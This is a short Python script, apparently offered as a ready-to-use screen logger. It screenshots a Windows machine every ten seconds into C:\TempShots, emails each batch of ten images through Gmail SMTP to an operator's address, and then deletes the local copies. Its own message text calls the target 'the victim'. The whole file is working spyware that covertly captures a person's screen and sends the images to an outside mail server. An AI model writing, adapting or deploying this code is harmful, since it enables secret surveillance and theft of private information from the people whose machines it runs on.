import pyautogui
import time
import os
import shutil
import smtplib
from email.message import EmailMessage

def send_mail():
    try:
        msg = EmailMessage()
        msg["From"] = " "   # Here goes your mail.
        msg["To"] = " "     # Here goes your mail.
        msg["Subject"] = "PYTHON's Screen logger captured screenshots"
        
        body="Screen Shots from the victim's system"
        msg.set_content(body)
        
        pictures=os.listdir("TempShots")
        path = "C:\\TempShots\\"
        
        for image in pictures:
            file = open(path+image, "rb")
            img_data = file.read()
            img_name = file.name
            msg.add_attachment(img_data ,maintype="image", subtype="png", filename=img_name)
            file.close()

        server = smtplib.SMTP("smtp.gmail.com",587)
        server.ehlo()
        server.starttls()
        server.login("your_mail_id","password")   # Here goes your mail id and password.
        server.send_message(msg)

        server.close()
        shutil.rmtree("TempShots")
    except Exception as mail_error:
        shutil.rmtree("TempShots")
        pass

count=0
os.chdir("C:\\")

if "TempShots" in os.listdir("C:"):
    send_mail()
    print("Screen Captured!!!")
else :
    os.mkdir("C:TempShots")

while True:
    if "TempShots" not in os.listdir("C:"):    
        os.mkdir("C:TempShots")
    shot=pyautogui.screenshot()    
    shot.save("C:TempShots\\sc_shot_0"+str(count)+".png")
    count +=1
    if count >=10 :
        send_mail()
        count=0
    time.sleep(10)   
